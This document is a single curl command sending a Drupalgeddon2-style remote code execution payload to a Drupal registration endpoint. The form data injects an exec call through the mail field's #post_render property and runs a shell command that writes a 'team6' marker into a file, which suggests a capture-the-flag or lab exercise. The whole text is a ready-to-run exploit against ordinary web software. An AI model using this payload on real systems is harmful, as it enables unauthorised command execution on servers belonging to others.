curl --location --request POST 'http://arcadia-api.gke.nginx.rocks/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
--header 'Cache-Control: no-cache' \
--header 'Connection: keep-alive' \
--header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-raw 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render[]=exec&mail[#type]=markup&mail[#markup]=echo "team6 representing 73de29021fd0d8d2cfd204d2d955a46d"|tee t6nv'